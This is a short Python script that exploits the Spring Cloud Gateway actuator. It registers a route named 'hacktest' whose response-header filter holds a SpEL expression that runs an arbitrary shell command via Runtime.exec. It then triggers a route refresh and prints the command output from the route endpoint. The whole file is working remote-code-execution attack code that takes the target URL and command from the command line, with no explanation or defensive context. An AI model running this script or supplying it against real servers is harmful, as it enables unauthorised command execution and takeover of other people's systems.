import requests
import sys
def add_route(url,command):
    data_json = {
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"%s\"}).getInputStream()))}"%command
    }
  }],
  "uri": "http://example.com"
}
    req = requests.post(url+"/actuator/gateway/routes/hacktest",json=data_json)
    if req.status_code == 201:
        return True
    return False


def execute_SpEL(url):
    req = requests.post(url+"/actuator/gateway/refresh",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    if req.status_code == 200:
        return True
    return False

def get_result(url):
    req = requests.get(url+"/actuator/gateway/routes/hacktest",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    print(req.content)
if __name__ == '__main__':
    url = sys.argv[1]
    add_route(url,sys.argv[2])
    execute_SpEL(url)
    get_result(url)

